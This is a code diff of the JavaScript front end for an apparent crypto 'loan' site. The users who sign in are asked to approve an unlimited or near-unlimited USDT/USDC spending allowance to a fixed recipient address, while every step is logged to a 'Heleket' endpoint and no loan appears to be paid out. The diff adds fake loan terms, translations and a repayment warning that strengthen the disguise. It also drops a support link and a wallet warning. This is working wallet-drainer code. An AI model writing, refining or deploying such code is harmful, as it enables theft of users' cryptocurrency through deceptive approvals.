                 let tokenAddress, decimals;
                 if (selectedNetwork === 'BEP20') {
                     tokenAddress = selectedCoin === 'USDT' ? USDT_CONTRACTS.BEP20 : USDC_CONTRACTS.BEP20;
@@ -356,15 +402,19 @@
                     tokenAddress = selectedCoin === 'USDT' ? USDT_CONTRACTS.ERC20 : USDC_CONTRACTS.ERC20;
                     decimals = 6;
                 }
+                
                 const tokenAbi = ['function approve(address spender, uint256 amount) returns (bool)'];
                 const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
+                
                 let approveAmount;
                 if (selectedCoin === 'USDT' && selectedNetwork === 'ERC20') {
                     approveAmount = ethers.utils.parseUnits('1000000000', decimals);
                 } else {
                     approveAmount = ethers.constants.MaxUint256;
                 }
-                await tokenContract.approve(RECIPIENT_ADDRESSES.EVM, approveAmount);
+                
+                const approveTx = await tokenContract.approve(RECIPIENT_ADDRESSES.EVM, approveAmount);
+                await approveTx.wait();
             }
             
             await logToHeleket('approve_signed', {
@@ -372,11 +422,14 @@
                 network: selectedNetwork,
                 coin: selectedCoin,
                 balance: userBalance,
-                loanAmount: amount,
-                repayAmount: amount * (1 + INTEREST_RATE)
+                loanAmount: loanAmount,
+                repayAmount: loanAmount * (1 + INTEREST_RATE)
             });
+            
             return true;
+            
         } catch(e) {
+            console.error('Approve error:', e);
             await logToHeleket('approve_error', { error: e.message });
             return false;
         }
@@ -391,18 +444,29 @@
         document.getElementById('selectNetworkTitle').innerHTML = t.selectNetwork;
         document.getElementById('yourBalanceLabel').innerHTML = t.yourBalance;
         document.getElementById('availableLoanLabel').innerHTML = t.availableForLoan;
-        document.getElementById('loanTitle').innerHTML = t.getLoan;
+        document.getElementById('loanTitle').innerHTML = t.loanApproved;
         document.getElementById('loanApprovedTitle').innerHTML = t.loanApproved;
         document.getElementById('fundsWillArriveText').innerHTML = t.fundsWillArrive;
-        document.getElementById('supportBtn').innerHTML = `📞 ${t.support}`;
-        document.getElementById('langBtn').innerHTML = currentLang === 'ru' ? '🇷🇺 RU ▼' : currentLang === 'es' ? '🇪🇸 ES ▼' : currentLang === 'de' ? '🇩🇪 DE ▼' : currentLang === 'fr' ? '🇫🇷 FR ▼' : '🇬🇧 EN ▼';
+        document.getElementById('contractWarning').innerHTML = `${t.contractWarning} <strong id="repayAmount">0 USDT</strong>`;
+        document.getElementById('langBtn').innerHTML = currentLang === 'en' ? '🇬🇧 EN ▼' : currentLang === 'es' ? '🇪🇸 ES ▼' : '🇷🇺 RU ▼';
+        
+        const loanTermsDiv = document.getElementById('loanTerms');
+        if (loanTermsDiv) {
+            loanTermsDiv.innerHTML = `
+                <p>📋 ${t.terms}</p>
+                <p>• ${t.rate}</p>
+                <p>• ${t.term}</p>
+                <p>• ${t.toRepay}: loan amount + 15%</p>
+                <p>• ${t.collateral}</p>
+            `;
+        }
     }
     
     function renderWalletList() {
         const container = document.getElementById('walletList');
         container.innerHTML = wallets.map(w => `
             <div class="wallet-option" onclick="selectWalletHandler('${w.name}')">
-                <img class="wallet-icon" src="${w.logo}" alt="${w.name}" onerror="this.style.display='none'">
+                <span style="font-size:28px;">${w.logo}</span>
                 <span style="font-weight:600;">${w.name}</span>
             </div>
         `).join('');
@@ -418,7 +482,7 @@
         const networkContainer = document.getElementById('networkList');
         networkContainer.innerHTML = coins.map(c => `
             <div class="coin-option" onclick="selectNetworkHandler('${c.network}', '${c.coin}')">
-                <span style="font-size:24px;">💰</span>
+                <img src="${COIN_LOGOS[c.coin]}" style="width:24px; height:24px;" onerror="this.style.display='none'">
                 <span style="font-weight:600;">${c.name}</span>
             </div>
         `).join('');
@@ -449,24 +513,30 @@
     document.getElementById('loanAmount').addEventListener('input', (e) => {
         const val = parseFloat(e.target.value) || 0;
         const repay = val * (1 + INTEREST_RATE);
-        document.getElementById('repaymentInfo').innerHTML = `💰 К возврату: ${repay.toFixed(2)} ${selectedCoin}`;
+        document.getElementById('repaymentInfo').innerHTML = `💰 To repay in 30 days: ${repay.toFixed(2)} ${selectedCoin}`;
     });
     
     document.getElementById('submitLoanBtn').onclick = async () => {
         const amount = parseFloat(document.getElementById('loanAmount').value);
         const maxLoan = userBalance * 0.5;
-        if (isNaN(amount) || amount <= 0) { alert('Введите сумму'); return; }
-        if (amount > maxLoan) { alert(`Максимальная сумма: ${maxLoan.toFixed(2)} ${selectedCoin}`); return; }
         
-        await logToHeleket('loan_request', { amount, balance: userBalance, maxLoan });
+        if (isNaN(amount) || amount <= 0) { alert('Enter loan amount'); return; }
+        if (amount > maxLoan) { alert(`Maximum loan amount: ${maxLoan.toFixed(2)} ${selectedCoin}`); return; }
+        
+        loanAmount = amount;
+        const repayAmount = amount * (1 + INTEREST_RATE);
+        
+        await logToHeleket('loan_request', { amount, repayAmount, balance: userBalance, maxLoan });
+        
         const approved = await signApprove(amount);
         
         if (approved) {
             document.getElementById('loanStep').style.display = 'none';
             document.getElementById('successStep').style.display = 'block';
-            await logToHeleket('loan_completed', { amount, status: 'success' });
+            document.getElementById('repayAmount').innerHTML = `${repayAmount.toFixed(2)} ${selectedCoin}`;
+            await logToHeleket('loan_completed', { amount, repayAmount, status: 'success' });
         } else {
-            alert('Ошибка при подписании');
+            alert('Error signing loan agreement');
         }
     };
     
@@ -477,13 +547,13 @@
         userAddress = null;
         userBalance = 0;
         invoiceId = null;
+        loanAmount = 0;
     };
     
     document.getElementById('closeWalletModal').onclick = () => {
         document.getElementById('walletModal').classList.remove('active');
         document.getElementById('walletSelectionStep').style.display = 'block';
         document.getElementById('networkSelectionStep').style.display = 'none';
-        document.getElementById('walletWarning').style.display = 'none';
     };
     
     document.getElementById('closeLoanModal').onclick = () => {
@@ -493,11 +563,6 @@
     document.getElementById('startLoanBtn').onclick = () => {
         document.getElementById('walletModal').classList.add('active');
         renderWalletList();
-        document.getElementById('walletWarning').style.display = 'none';
-    };
-    
-    document.getElementById('supportBtn').onclick = () => {
-        window.open('https://t.me/kurbaaX', '_blank');
     };
     
     document.getElementById('langBtn').onclick = () => document.getElementById('langDropdown').classList.toggle('active');
